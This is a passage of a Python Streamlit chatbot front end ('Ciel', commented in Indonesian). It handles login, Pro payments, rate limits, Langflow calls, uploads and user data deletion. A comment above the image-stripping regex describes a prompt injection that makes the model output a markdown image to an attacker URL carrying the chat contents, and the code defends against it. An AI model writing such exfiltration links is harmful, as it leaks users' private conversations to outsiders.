if not LANGFLOW_API_KEY:
    missing_config.append("LANGFLOW_API_KEY")

if not FLOW_ID:
    missing_config.append("FLOW_ID")


if missing_config:

    st.error(
        "Konfigurasi belum lengkap.\n\n"
        f"Variabel yang belum tersedia: "
        f"{', '.join(missing_config)}"
    )

    st.stop()


# ============================================================
# SESSION STATE
# ============================================================

# Chat dan proyek hanya hidup selama sesi browser ini, kecuali untuk
# pengguna login saat CHAT_STORE aktif (dimuat di bawah USER IDENTITY).
if "chats" not in st.session_state:
    st.session_state.chats = {}

if "projects" not in st.session_state:
    st.session_state.projects = {}

if "active_chat" not in st.session_state:
    st.session_state.active_chat = None

if "active_project" not in st.session_state:
    st.session_state.active_project = None

if "pending" not in st.session_state:
    st.session_state.pending = None

if "upload_nonce" not in st.session_state:
    st.session_state.upload_nonce = 0

# Identitas anonim per sesi browser, dipakai untuk session_id dan rate limit.
if "visitor_id" not in st.session_state:
    st.session_state.visitor_id = uuid.uuid4().hex[:16]


# ============================================================
# USER IDENTITY
# ============================================================

def logged_in():
    return AUTH_ENABLED and bool(st.user.get("is_logged_in"))


def memory_owner_id():
    """
    ID pemilik long-term memory: hash stabil dari akun login.
    Kosong untuk pengguna anonim, sehingga komponen memory di flow
    menolak membaca/menyimpan dan memory tidak bocor antar pengunjung.
    """
    if not logged_in():
        return ""

    subject = st.user.get("sub") or st.user.get("email")

    if not subject:
        return ""

    return hashlib.sha256(f"ciel-memory:{subject}".encode()).hexdigest()[:16]


def user_key():
    return memory_owner_id() or st.session_state.visitor_id


def chat_owner():
    """Pemilik chat dan proyek tersimpan; kosong jika tidak login atau tanpa database."""
    return memory_owner_id() if CHAT_STORE else ""


def sync_chat_owner():
    """
    Muat proyek dan riwayat tersimpan saat sesi dimulai atau akun berganti.
    Data akun sebelumnya dibuang dari sesi, supaya tidak terlihat lagi
    setelah keluar.
    """
    owner = chat_owner()
    previous = st.session_state.get("chats_owner", "")

    if owner == previous:
        return

    st.session_state.chats_owner = owner

    if previous:
        st.session_state.chats = {}
        st.session_state.projects = {}
        st.session_state.active_chat = None
        st.session_state.active_project = None

    if not owner:
        return

    # Proyek dulu, supaya chat yang dimuat langsung masuk ke proyeknya. Jika
    # proyek gagal dimuat, project_id chat tetap disimpan apa adanya: chat
    # tetap tampil di "Semua chat" dan kembali ke proyeknya saat berhasil.
    projects = CHAT_STORE.load_projects(owner)

    if projects is None:
        store_notice("Proyek tersimpan gagal dimuat.")
    else:
        st.session_state.projects = {**projects, **st.session_state.projects}

    loaded = CHAT_STORE.load(owner)

    if loaded is None:
        store_notice("Riwayat chat tersimpan gagal dimuat.")
        return

    st.session_state.chats = {**loaded, **st.session_state.chats}


def store_notice(text):
    """Pesan gagal untuk sidebar; st.toast tepat sebelum st.rerun tidak sempat tampil."""
    st.session_state.store_notice = text


def persist_chat(chat):
    owner = chat_owner()

    if owner and not CHAT_STORE.save(owner, chat):
        store_notice("Riwayat chat gagal disimpan.")


def persist_project(project):
    owner = chat_owner()

    if owner and not CHAT_STORE.save_project(owner, project):
        store_notice("Proyek gagal disimpan.")


sync_chat_owner()


# ============================================================
# CIEL PRO
# ============================================================

# Status Pro untuk tampilan dibaca ulang paling lama tiap 5 menit. Saat
# Riset Skripsi dikirim, status selalu dibaca langsung dari database.
PRO_STATUS_TTL = 300


def pro_until(refresh=False):
    """Akhir masa Pro (epoch detik); 0.0 jika bukan Pro, None jika gagal dibaca."""

    owner = chat_owner()

    if not owner:
        return 0.0

    cached = st.session_state.get("pro_status")
    now = time.time()

    if refresh or not cached or cached[0] != owner or now - cached[1] > PRO_STATUS_TTL:
        cached = (owner, now, CHAT_STORE.load_pro_until(owner))
        st.session_state.pro_status = cached

    return cached[2]


def is_pro(refresh=False):
    until = pro_until(refresh)
    return bool(until) and until > time.time()


def pro_status_html():
    """Baris paket di menu akun; kosong jika status Pro tidak dipakai di deployment ini."""

    if not CHAT_STORE:
        return ""

    until = pro_until()

    if until is None:
        text = "Paket: status belum bisa dimuat."
    elif until > time.time():
        text = f"Paket: <b>Pro</b>, aktif sampai {format_date_id(until)}."
    elif until:
        text = f"Paket: Gratis. Masa Pro berakhir {format_date_id(until)}."
    else:
        text = "Paket: Gratis."

    return f"<p>{text}</p>"


MONTHS_ID = (
    "Januari", "Februari", "Maret", "April", "Mei", "Juni",
    "Juli", "Agustus", "September", "Oktober", "November", "Desember",
)


def format_date_id(epoch):
    """1795132800 -> "17 November 2026" (WIB, zona pengguna Ciel)."""
    day = time.gmtime(epoch + 7 * 3600)
    return f"{day.tm_mday} {MONTHS_ID[day.tm_mon - 1]} {day.tm_year}"


# ------------------------------------------------------------
# PEMBELIAN PRO (MIDTRANS)
# ------------------------------------------------------------

PRO_PRICE = next(plan["monthly"] for plan in PLANS if plan["id"] == "pro")
# Status order terakhir ditampilkan di Pricing selama ini setelah dibuat,
# yaitu saat pengguna kembali dari halaman bayar Midtrans.
RECENT_ORDER_SECONDS = 2 * 3600


def start_pro_checkout():
    """Tombol "Beli Pro": buat order lalu transaksi Snap untuk akun yang login."""

    owner = chat_owner()

    if not (PAYMENTS_ENABLED and owner):
        return

    order_id = new_order_id()

    if not CHAT_STORE.create_order(owner, order_id, PRO_PRICE):
        st.session_state.checkout = {"error": "Order belum bisa dibuat. Silakan coba lagi."}
        return

    url = create_snap_transaction(
        MIDTRANS_SERVER_KEY,
        MIDTRANS_PRODUCTION,
        snap_payload(
            order_id,
            PRO_PRICE,
            finish_url(APP_URL or st.context.url),
            email=st.user.get("email"),
            name=st.user.get("name"),
        ),
    )

    if not url:
        st.session_state.checkout = {"error": "Halaman pembayaran belum bisa dibuka. Silakan coba lagi."}
        return

    logger.info("checkout_created order=%s", order_id)
    st.session_state.checkout = {"order_id": order_id, "url": url}


def render_pro_action():
    """Isi kartu Pro di Pricing: status bayar terakhir dan tombol beli."""

    if not logged_in():
        st.button("Masuk untuk membeli", key="pro_login", type="primary", on_click=show_login)
        return

    checkout = st.session_state.get("checkout") or {}

    if checkout.get("url"):
        st.link_button("Bayar di Midtrans", checkout["url"], type="primary", icon=":material/payments:")
        st.markdown(
            '<p class="ciel-paynote">Halaman bayar berlaku 60 menit. Setelah membayar, '
            "kembali ke halaman ini; Pro aktif begitu Midtrans mengonfirmasi.</p>",
            unsafe_allow_html=True,
        )
        return

    if checkout.get("error"):
        st.error(checkout["error"])

    # Status dari database, bukan dari parameter URL Midtrans.
    order = CHAT_STORE.load_latest_order(chat_owner())
    recent = bool(order) and time.time() - order["created_at"] < RECENT_ORDER_SECONDS
    message = order_message(order) if recent else None
    until = pro_until(refresh=bool(message and message[0] == "ok"))

    if message:
        kind, text = message
        if kind == "ok" and until and until > time.time():
            text = f"Pembayaran diterima. Ciel Pro aktif sampai {format_date_id(until)}."
        {"ok": st.success, "wait": st.info, "fail": st.error}[kind](text)

        if kind == "wait":
            st.button("Cek lagi", key="pro_recheck", icon=":material/refresh:")

    active = bool(until) and until > time.time()

    if active and not message:
        st.markdown(
            f'<p class="ciel-paynote">Pro aktif sampai {format_date_id(until)}. '
            "Membeli lagi menambah 30 hari dari tanggal itu.</p>",
            unsafe_allow_html=True,
        )

    st.button(
        "Perpanjang 30 hari" if active else "Beli Pro 30 hari",
        key="pro_buy",
        type="primary",
        icon=":material/shopping_cart:",
        on_click=start_pro_checkout,
    )


# ============================================================
# ERRORS
# ============================================================

class CielError(str):
    """
    Pesan gagal untuk pengguna (judul, saran, lalu detail teknis).

    Tipenya, bukan isi teksnya, yang membuat UI menampilkan kartu error
    dengan tombol coba lagi. Dulu pesan diawali emoji sebagai penanda;
    sekarang teksnya bisa ditulis sebagai kalimat biasa.
    """


# ============================================================
# SECURITY LOG
# ============================================================

def security_event(kind, **fields):
    """Satu format log untuk kejadian keamanan, mudah dicari di log Streamlit Cloud."""
    details = "".join(f" {key}={value}" for key, value in fields.items())
    logger.warning("security_event kind=%s%s", kind, details)


# ============================================================
# RATE LIMIT
# ============================================================

HOUR = 3600
DAY = 24 * HOUR


def rate_limit_full(store, limits, now):
    """
    `limits` adalah {key: (batas, jendela_detik)}. Jika semua key masih di
    bawah batasnya, catat satu request di setiap key dan kembalikan None.
    Jika tidak, jangan catat apa pun dan kembalikan key pertama yang penuh.
    """
    recent = {
        key: [t for t in store.get(key, ()) if now - t < window]
        for key, (_, window) in limits.items()
    }

    full = next(
        (key for key, (limit, _) in limits.items() if len(recent[key]) >= limit),
        None,
    )

    for key, times in recent.items():

        if full is None:
            times.append(now)

        if times:
            store[key] = times
        else:
            store.pop(key, None)

    return full


@st.cache_resource
def rate_limit_state():
    # Dibagi semua sesi di proses server ini; reset saat app restart.
    return {"lock": threading.Lock(), "hits": {}}


# Kuota harian fitur Pro per akun: {fitur: (batas, kalimat untuk pesan saat habis)}.
FEATURE_QUOTAS = {
    "riset": (RISET_SKRIPSI_PER_DAY, "Riset Skripsi bisa dipakai {limit} kali"),
    "kerangka": (KERANGKA_PER_DAY, "Kerangka Bab 1–3 bisa disusun {limit} kali"),
    "cek": (CEK_KUTIPAN_PER_DAY, "Cek kutipan & kemiripan bisa dipakai {limit} kali"),
}


def rate_limits_for_request(feature=None):
    """
    {key: (batas, jendela)} untuk pengirim pesan ini, plus batas harian semua
    pengguna. Fitur Pro (FEATURE_QUOTAS) juga punya kuota harian sendiri.
    """

    if logged_in():
        pro = is_pro()
        limits = {
            f"user:{user_key()}:hour": (RATE_LIMIT_PER_HOUR_PRO if pro else RATE_LIMIT_PER_HOUR_LOGIN, HOUR),
            f"user:{user_key()}:day": (RATE_LIMIT_PER_DAY_PRO if pro else RATE_LIMIT_PER_DAY_LOGIN, DAY),
        }

        if feature in FEATURE_QUOTAS:
            limits[f"{feature}:{user_key()}:day"] = (FEATURE_QUOTAS[feature][0], DAY)
    else:
        limits = {
            f"visitor:{user_key()}:hour": (RATE_LIMIT_PER_HOUR, HOUR),
            "anon:total:hour": (RATE_LIMIT_ANON_TOTAL_PER_HOUR, HOUR),
            "anon:total:day": (RATE_LIMIT_ANON_TOTAL_PER_DAY, DAY),
        }

    limits["all:total:day"] = (RATE_LIMIT_TOTAL_PER_DAY, DAY)

    return limits


def rate_limit_message(key, limit):
    """Penjelasan untuk batas yang tercapai (key dari rate_limits_for_request)."""

    period = "jam" if key.endswith(":hour") else "hari"

    feature = key.split(":")[0]

    if feature in FEATURE_QUOTAS:
        return (
            FEATURE_QUOTAS[feature][1].format(limit=limit)
            + " per hari per akun. Kuota hari ini sudah habis, coba lagi besok."
        )

    if key.startswith("user:"):
        return f"Ciel menerima hingga {limit} pesan per {period} per akun. Silakan coba lagi nanti."

    if key.startswith("visitor:"):
        return f"Tanpa login, Ciel menerima hingga {limit} pesan per jam. Silakan coba lagi nanti."

    if key.startswith("anon:"):
        return (
            f"Kuota bersama untuk semua pengguna tanpa login ({limit} pesan per {period}) "
            "sedang habis. Silakan coba lagi nanti."
        )

    return "Ciel sedang menerima terlalu banyak pesan hari ini. Silakan coba lagi besok."


def check_rate_limit(feature=None):
    """Kembalikan None jika boleh lanjut, atau CielError yang menyebut batas yang tercapai."""

    limits = rate_limits_for_request(feature)
    state = rate_limit_state()

    with state["lock"]:
        full = rate_limit_full(state["hits"], limits, time.time())

    if full is None:
        return None

    scope = full.split(":")[0]
    security_event("rate_limited", scope=scope, period=full.rsplit(":", 1)[-1], logged_in=logged_in())

    hint = (
        " Masuk dengan akun Google untuk batas yang lebih tinggi."
        if AUTH_ENABLED and scope in ("visitor", "anon")
        else ""
    )

    return CielError(
        "Batas pesan tercapai.\n\n"
        f"{rate_limit_message(full, limits[full][0])}{hint}"
    )


# ============================================================
# LANGFLOW API
# ============================================================

def final_answer_text(message):
    """
    Langflow 1.12 menyusun Message.text dari semua blok teks di semua
    putaran Agent (teks sebelum memanggil tool, jawaban yang ditulis ulang),
    sehingga jawaban bisa muncul dua kali atau tersambung tanpa spasi.
    Jawaban akhir adalah blok teks terakhir yang ditulis model; blok berjudul
    "Output" adalah gabungan buatan Langflow. Tanpa content_blocks, pakai
    data.text seperti sebelumnya (KeyError jika struktur tidak dikenal).
    """
    if not isinstance(message, dict):
        raise TypeError("results.message bukan objek")

    texts = [
        content.get("text")
        for block in message.get("content_blocks") or []
        for content in block.get("contents") or []
        if content.get("type") == "text"
        and not (content.get("header") or {}).get("title")
        and str(content.get("text") or "").strip()
    ]

    if texts:
        return texts[-1]

    return message["data"]["text"]


# Gambar markdown dimuat browser tanpa diklik. Prompt injection (halaman web,
# file, foto) bisa menyuruh model menulis ![](https://penyerang/?d=<isi chat>),
# jadi jawaban tidak pernah menampilkan gambar dari luar.
MARKDOWN_IMAGE = re.compile(
    r"!\[[^\]]*\]"                              # ![alt]
    r"(?:\((?:[^()]|\([^()]*\))*\)|\[[^\]]*\])?"  # (url "judul") atau [ref], atau tanpa keduanya
    r"|<img\b[^>]*>",
    re.IGNORECASE,
)
IMAGE_REMOVED = "[gambar dihapus]"


def strip_markdown_images(text):
    """Ganti setiap gambar markdown/HTML dengan penanda. Kembalikan (teks, jumlah)."""
    return MARKDOWN_IMAGE.subn(IMAGE_REMOVED, str(text))


def ask_langflow(message, tweaks=None, session_id=None, flow_id=None, timeout=240):

    flow_id = flow_id or FLOW_ID

    request_id = uuid.uuid4().hex[:8]
    start_time = time.perf_counter()

    url = (
        f"{NGROK_URL}"
        f"/api/v1/run/{flow_id}"
    )

    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "x-api-key": LANGFLOW_API_KEY,
    }

    payload = {
        "input_value": message,
        "input_type": "chat",
        "output_type": "chat",
    }

    if tweaks:
        payload["tweaks"] = tweaks

    # Tanpa session_id Langflow memakai satu session default, sehingga
    # riwayat Agent tercampur antar pengunjung dan antar chat.
    if session_id:
        payload["session_id"] = session_id

    logger.info(
        "request_start id=%s flow=%s input_length=%d",
        request_id,
        flow_id,
        len(message),
    )

    try:

        response = requests.post(
            url,
            headers=headers,
            auth=(
                NGROK_USER,
                NGROK_PASSWORD
            ),
            json=payload,
            params={
                "stream": "false"
            },
            # Pesan bergambar + beberapa tool bisa > 2 menit di backend CPU.
            timeout=timeout,
        )

        elapsed = time.perf_counter() - start_time

        logger.info(
            "request_response id=%s status=%s elapsed=%.2fs",
            request_id,
            response.status_code,
            elapsed,
        )

        response.raise_for_status()

        data = response.json()

        try:

            answer = final_answer_text(
                data["outputs"][0]
                ["outputs"][0]
                ["results"]["message"]
            )

            answer, removed = strip_markdown_images(answer)

            if removed:
                security_event("answer_image_removed", id=request_id, count=removed)

            logger.info(
                "request_success id=%s elapsed=%.2fs output_length=%d",
                request_id,
                elapsed,
                len(answer),
            )

            return answer

        except (KeyError, IndexError, TypeError):

            # Isi response hanya masuk log server; pengguna publik tidak
            # boleh melihat JSON mentah Langflow (struktur flow, isi tool).
            logger.error(
                "response_parse_error id=%s elapsed=%.2fs detail=%s",
                request_id,
                elapsed,
                str(data)[:500],
            )

            return CielError(
                "Jawaban Ciel tidak bisa dibaca.\n\n"
                "Silakan coba lagi. Jika terus terjadi, sampaikan kode "
                "di bagian detail teknis kepada pengelola.\n\n"
                f"Request ID: `{request_id}`\n"
                "Penyebab: format output tidak dikenali."
            )

    except requests.exceptions.Timeout:

        elapsed = time.perf_counter() - start_time

        logger.error(
            "request_timeout id=%s elapsed=%.2fs",
            request_id,
            elapsed,
        )

        return CielError(
            "Ciel terlalu lama menjawab.\n\n"
            "Pertanyaan riset bisa memakan waktu lama. Silakan coba lagi, "
            "atau persempit pertanyaannya.\n\n"
            f"Request ID: `{request_id}`\n"
            f"Penyebab: request timeout setelah {timeout} detik."
        )

    except requests.exceptions.ConnectionError:

        elapsed = time.perf_counter() - start_time

        logger.error(
            "connection_error id=%s elapsed=%.2fs",
            request_id,
            elapsed,
        )

        return CielError(
            "Ciel sedang tidak bisa dihubungi.\n\n"
            "Server Ciel mungkin sedang offline. Silakan coba lagi sebentar lagi.\n\n"
            f"Request ID: `{request_id}`\n"
            "Penyebab: koneksi ke backend gagal."
        )

    except requests.exceptions.HTTPError as error:

        elapsed = time.perf_counter() - start_time
        status = response.status_code

        # Detail error Langflow hanya masuk log server, tidak ditampilkan
        # ke pengguna. Tanpa ini penyebab HTTP 500 tidak bisa dilacak.
        logger.error(
            "http_error id=%s status=%s elapsed=%.2fs detail=%s",
            request_id,
            status,
            elapsed,
            (getattr(response, "text", "") or "")[:500],
        )

        if status in (401, 403):
            return CielError(
                "Ciel sedang tidak bisa menjawab.\n\n"
                "Ada masalah konfigurasi di server. Pengelola perlu memeriksanya.\n\n"
                f"HTTP Status: {status}\n"
                f"Request ID: `{request_id}`\n"
                "Penyebab: autentikasi ke backend ditolak."
            )

        if status == 429:
            return CielError(
                "Ciel sedang menerima terlalu banyak permintaan.\n\n"
                "Silakan coba lagi dalam beberapa saat.\n\n"
                f"HTTP Status: {status}\n"
                f"Request ID: `{request_id}`"
            )

        if status == 500:
            return CielError(
                "Ciel mengalami gangguan saat menyusun jawaban.\n\n"
                "Silakan coba lagi.\n\n"
                f"HTTP Status: {status}\n"
                f"Request ID: `{request_id}`\n"
                "Penyebab: internal error di backend."
            )

        if status in (502, 503, 504):
            return CielError(
                "Ciel sedang tidak tersedia.\n\n"
                "Server sedang mengalami gangguan sementara. Silakan coba lagi nanti.\n\n"
                f"HTTP Status: {status}\n"
                f"Request ID: `{request_id}`"
            )

        return CielError(
            "Permintaan ke Ciel gagal.\n\n"
            "Silakan coba lagi.\n\n"
            f"HTTP Status: {status}\n"
            f"Request ID: `{request_id}`"
        )

    except requests.exceptions.RequestException as error:

        elapsed = time.perf_counter() - start_time

        # Pesan exception bisa memuat URL/host backend (ngrok); cukup di log.
        logger.error(
            "request_error id=%s elapsed=%.2fs type=%s error=%s",
            request_id,
            elapsed,
            type(error).__name__,
            error,
        )

        return CielError(
            "Permintaan ke Ciel gagal.\n\n"
            "Terjadi gangguan saat menghubungi Ciel. Silakan coba lagi.\n\n"
            f"Request ID: `{request_id}`"
        )

    except ValueError:

        elapsed = time.perf_counter() - start_time

        logger.error(
            "json_error id=%s elapsed=%.2fs",
            request_id,
            elapsed,
        )

        return CielError(
            "Jawaban Ciel tidak bisa dibaca.\n\n"
            "Silakan coba lagi.\n\n"
            f"Request ID: `{request_id}`\n"
            "Penyebab: response bukan JSON yang valid."
        )


# ============================================================
# IMAGE UPLOAD (LANGFLOW FILES API)
# ============================================================

def upload_images(images):
    """
    Unggah gambar ke Langflow agar bisa dipakai komponen Chat Input.

    Mengembalikan (daftar_path, None) jika berhasil, atau
    ([], pesan_error) dengan format pesan yang sama seperti
    ask_langflow() agar UI menampilkannya sebagai error.
    """

    request_id = uuid.uuid4().hex[:8]
    start_time = time.perf_counter()

    url = (
        f"{NGROK_URL}"
        f"/api/v1/files/upload/{FLOW_ID}"
    )

    headers = {
        "Accept": "application/json",
        "x-api-key": LANGFLOW_API_KEY,
    }

    logger.info(
        "image_upload_start id=%s count=%d",
        request_id,
        len(images),
    )

    paths = []

    try:

        for image in images:

            response = requests.post(
                url,
                headers=headers,
                auth=(
                    NGROK_USER,
                    NGROK_PASSWORD
                ),
                files={
                    "file": (
                        image["name"],
                        image["data"],
                        image["mime"],
                    )
                },
                timeout=60,
            )

            response.raise_for_status()

            data = response.json()

            path = data.get("file_path") or data.get("path")

            if not path:
                raise ValueError("file_path tidak ada di response")

            paths.append(path)

        logger.info(
            "image_upload_success id=%s count=%d elapsed=%.2fs",
            request_id,
            len(paths),
            time.perf_counter() - start_time,
        )

        return paths, None

    except requests.exceptions.Timeout:

        logger.error("image_upload_timeout id=%s", request_id)

        return [], CielError(
            "Gambar gagal diunggah.\n\n"
            "Gambarnya terlalu besar atau koneksi lambat. "
            "Coba gambar yang lebih kecil.\n\n"
            f"Request ID: `{request_id}`\n"
            "Penyebab: upload timeout."
        )

    except requests.exceptions.ConnectionError:

        logger.error("image_upload_connection_error id=%s", request_id)

        return [], CielError(
            "Gambar gagal diunggah.\n\n"
            "Server Ciel sedang tidak bisa dihubungi. Silakan coba lagi sebentar lagi.\n\n"
            f"Request ID: `{request_id}`\n"
            "Penyebab: koneksi ke backend gagal."
        )

    except requests.exceptions.HTTPError:

        status = response.status_code

        logger.error(
            "image_upload_http_error id=%s status=%s",
            request_id,
            status,
        )

        if status in (401, 403):
            return [], CielError(
                "Gambar gagal diunggah.\n\n"
                "Ada masalah konfigurasi di server. Pengelola perlu memeriksanya.\n\n"
                f"HTTP Status: {status}\n"
                f"Request ID: `{request_id}`\n"
                "Penyebab: autentikasi ke backend ditolak."
            )

        if status in (404, 405):
            return [], CielError(
                "Gambar gagal diunggah.\n\n"
                "Server ini belum bisa menerima gambar.\n\n"
                f"HTTP Status: {status}\n"
                f"Request ID: `{request_id}`\n"
                "Penyebab: endpoint upload tidak ditemukan (versi Langflow atau flow ID)."
            )

        return [], CielError(
            "Gambar gagal diunggah.\n\n"
            "Silakan coba lagi.\n\n"
            f"HTTP Status: {status}\n"
            f"Request ID: `{request_id}`"
        )

    except (ValueError, requests.exceptions.JSONDecodeError):

        logger.error("image_upload_parse_error id=%s", request_id)

        return [], CielError(
            "Gambar gagal diunggah.\n\n"
            "Silakan coba lagi.\n\n"
            f"Request ID: `{request_id}`\n"
            "Penyebab: response upload tidak dikenali."
        )

    except requests.exceptions.RequestException as error:

        # Pesan exception bisa memuat URL/host backend (ngrok); cukup di log.
        logger.error(
            "image_upload_error id=%s type=%s error=%s",
            request_id,
            type(error).__name__,
            error,
        )

        return [], CielError(
            "Gambar gagal diunggah.\n\n"
            "Terjadi gangguan saat mengunggah gambar. Silakan coba lagi.\n\n"
            f"Request ID: `{request_id}`"
        )


# ============================================================
# DATA SAYA (MEMORY DAN RIWAYAT CHAT DI SERVER)
# ============================================================

def memory_admin(action, memory_id="", dataset_name="", timeout=60):
    """
    Panggil flow "Ciel Memory Admin" untuk akun yang sedang login: memory
    dan dataset pribadi.

    Pemilik selalu memory_owner_id() dari app, bukan input pengguna atau
    model. Kembalikan dict hasil flow; kegagalan dicatat di log dengan
    Request ID dan dikembalikan sebagai {"ok": False, ...}.
    """

    owner = memory_owner_id()
    request_id = uuid.uuid4().hex[:8]

    if not owner or not MEMORY_ADMIN_FLOW_ID:
        return {"ok": False, "error": "unavailable"}

    tweak = {"memory_owner": owner, "memory_action": action, "memory_id": memory_id}

    if dataset_name:
        tweak["dataset_name"] = dataset_name

    try:
        response = requests.post(
            f"{NGROK_URL}/api/v1/run/{MEMORY_ADMIN_FLOW_ID}",
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json",
                "x-api-key": LANGFLOW_API_KEY,
            },
            auth=(NGROK_USER, NGROK_PASSWORD),
            params={"stream": "false"},
            json={
                "input_value": "",
                "input_type": "chat",
                "output_type": "chat",
                "session_id": f"{owner}-memory-admin",
                "tweaks": {MEMORY_ADMIN_NODE_ID: tweak},
            },
            timeout=timeout,
        )
        response.raise_for_status()

        text = (
            response.json()["outputs"][0]["outputs"][0]
            ["results"]["message"]["data"]["text"]
        )
        result = json.loads(text)

    except (requests.exceptions.RequestException, ValueError, KeyError, IndexError, TypeError) as error:
        logger.error(
            "memory_admin_error id=%s action=%s type=%s error=%s",
            request_id,
            action,
            type(error).__name__,
            error,
        )
        return {"ok": False, "error": "request_failed", "request_id": request_id}

    logger.info("memory_admin id=%s action=%s ok=%s", request_id, action, result.get("ok"))

    return result


def own_session_ids(session_ids, owner):
    """Session milik pemilik ini; app memakai session_id "<owner>-<chat id>"."""

    if not owner:
        return []

    prefix = f"{owner}-"

    return [s for s in session_ids if str(s).startswith(prefix)]


def delete_langflow_sessions(session_ids):
    """Hapus pesan Langflow dari session ini. Melempar RequestException jika gagal."""

    # Langflow menerima paling banyak 500 session per permintaan.
    for start in range(0, len(session_ids), 500):
        deleted = requests.delete(
            f"{NGROK_URL}/api/v1/monitor/messages/sessions",
            headers={"Accept": "application/json", "x-api-key": LANGFLOW_API_KEY},
            auth=(NGROK_USER, NGROK_PASSWORD),
            json=session_ids[start:start + 500],
            timeout=60,
        )
        deleted.raise_for_status()


def delete_server_chat_history():
    """Hapus semua pesan Langflow dari session milik akun yang sedang login."""

    owner = memory_owner_id()
    request_id = uuid.uuid4().hex[:8]

    if not owner:
        return {"ok": False, "error": "login_required"}

    try:
        listing = requests.get(
            f"{NGROK_URL}/api/v1/monitor/messages/sessions",
            headers={"Accept": "application/json", "x-api-key": LANGFLOW_API_KEY},
            auth=(NGROK_USER, NGROK_PASSWORD),
            timeout=60,
        )
        listing.raise_for_status()
        mine = own_session_ids(listing.json(), owner)
        delete_langflow_sessions(mine)

    except (requests.exceptions.RequestException, ValueError, TypeError) as error:
        logger.error(
            "chat_history_delete_error id=%s type=%s error=%s",
            request_id,
            type(error).__name__,
            error,
        )
        return {"ok": False, "error": "request_failed", "request_id": request_id}

    logger.info("chat_history_deleted id=%s sessions=%d", request_id, len(mine))

    return {"ok": True, "deleted_sessions": len(mine)}


def set_data_notice(result, success_text):
    if result.get("ok"):
        st.session_state.data_notice = ("success", success_text)
        return

    request_id = result.get("request_id")
    st.session_state.data_notice = (
        "error",
        "Permintaan gagal diproses. Silakan coba lagi."
        + (f" Request ID: {request_id}" if request_id else ""),
    )


def load_my_memories():
    st.session_state.my_memories = memory_admin("list")


def delete_my_memory(memory_id):
    set_data_notice(memory_admin("delete", memory_id), "Memory dihapus.")
    load_my_memories()


def delete_all_my_memories():
    result = memory_admin("delete_all")
    set_data_notice(result, f"{result.get('deleted', 0)} memory dihapus.")
    st.session_state.confirm_delete_memories = False
    load_my_memories()


def load_my_datasets():
    st.session_state.my_datasets = memory_admin("list_datasets")
    st.session_state.pop("dataset_export", None)


def export_my_dataset(name):
    result = memory_admin("export_dataset", dataset_name=name)

    if result.get("ok"):
        st.session_state.dataset_export = (name, result.get("text", ""))
    else:
        set_data_notice(result, "")


def delete_my_dataset(name):
    set_data_notice(memory_admin("delete_dataset", dataset_name=name), f"Dataset {name} dihapus.")
    load_my_datasets()


def delete_all_my_datasets():
    result = memory_admin("delete_all_datasets")
    set_data_notice(result, f"{result.get('deleted', 0)} dataset dihapus.")
    st.session_state.confirm_delete_datasets = False
    load_my_datasets()


def delete_my_chat_history():
    result = delete_server_chat_history()
    owner = chat_owner()

    if owner and result.get("ok"):
        if CHAT_STORE.delete_all(owner):
            st.session_state.chats = {}
            new_chat()
        else:
            result = {"ok": False, "error": "request_failed"}

    set_data_notice(
        result,
        f"Riwayat chat-mu di server dihapus ({result.get('deleted_sessions', 0)} percakapan).",
    )
    st.session_state.confirm_delete_history = False


# ============================================================
# UI HELPERS
# ============================================================

AVATARS = {
    "user": ":material/person:",
    "assistant": os.path.join(BRAND_DIR, "ciel-icon-192.png"),
}

# Inline copy of assets/brand/ciel-mark.svg, coloured by theme tokens.
CIEL_MARK_SVG = (
    '<svg class="ciel-mark" viewBox="0 0 32 32" aria-hidden="true">'
    '<path class="ciel-mark-ring" d="M24.89 10.6A11.8 11.8 0 1 0 24.89 21.4'
    'H20.57A8.2 8.2 0 1 1 20.57 10.6Z"/>'
    '<path class="ciel-mark-piece" d="M28.39 10.6A11.8 11.8 0 0 1 28.39 21.4'
    'H24.07A8.2 8.2 0 0 0 24.07 10.6Z"/>'
    "</svg>"
)

THINKING_HTML = (
    '<div class="ciel-thinking" role="status" aria-live="polite">'
    '<div class="ciel-thinking-head">'
    '<span class="ciel-dots" aria-hidden="true"><i></i><i></i><i></i></span>'
    "<span>Ciel sedang mencari dan memeriksa</span>"
    "</div>"
    '<div class="ciel-skel" aria-hidden="true"><b></b><b></b><b></b></div>'
    '<p class="ciel-thinking-note">Permintaan riset dapat memakan waktu hingga dua menit.</p>'
    "</div>"
)

KERANGKA_THINKING_HTML = THINKING_HTML.replace(
    "Ciel sedang mencari dan memeriksa", "Ciel sedang menyusun kerangka dari peta sumber"
).replace(
    "Permintaan riset dapat memakan waktu hingga dua menit.",
    "Biasanya sekitar setengah menit.",
)

RISET_THINKING_HTML = THINKING_HTML.replace(
    "Permintaan riset dapat memakan waktu hingga dua menit.",
    "Riset Skripsi membaca banyak sumber dan bisa memakan waktu beberapa menit. "
    "Biarkan tab ini tetap terbuka.",
)

# File yang dilampirkan dibaca sebagai teks lalu disisipkan ke prompt.
# Backend Langflow hanya menerima teks, jadi hanya format teks yang didukung;
# PDF diubah menjadi teks dulu di sini (tanpa OCR, jadi PDF hasil scan ditolak).
ALLOWED_FILE_TYPES = [
    "txt", "md", "markdown", "csv", "tsv", "json", "jsonl",
    "yaml", "yml", "xml", "html", "css", "js", "ts", "py",
    "sql", "log", "ini", "toml", "pdf",
]
ALLOWED_IMAGE_TYPES = ["png", "jpg", "jpeg", "bmp"]
IMAGE_MIME = {
    "png": "image/png",
    "jpg": "image/jpeg",
    "jpeg": "image/jpeg",
    "bmp": "image/bmp",
}
MAX_IMAGES_PER_MESSAGE = 4
MAX_IMAGE_BYTES = 5 * 1024 * 1024
# Dicek dari header sebelum gambar didekode: PNG 5 MB bisa berisi gambar
# raksasa (decompression bomb) yang menghabiskan memori server.
MAX_IMAGE_PIXELS = 90_000_000
# The vision model reads a 1024 px photo as well as the original; a phone photo
# (~3000x4000) needed 4283 tokens and failed the model's 4096-token context.
VISION_IMAGE_PX = 1024
THUMBNAIL_PX = 360
MAX_FILES_PER_MESSAGE = 5
# Teks yang diketik; teks panjang bisa dilampirkan sebagai file (MAX_FILE_CHARS).
MAX_MESSAGE_CHARS = 10_000
MAX_FILE_CHARS = 40_000
# Batas kerja ekstraksi PDF: berhenti setelah sekian halaman meski teksnya
# belum mencapai MAX_FILE_CHARS (mis. ratusan halaman gambar tanpa teks).
MAX_PDF_PAGES = 100
# Satu salinan konteks file per permintaan; Agent juga memuat salinan
# terakhir dari riwayat, jadi totalnya bisa dua kali lipat angka ini.
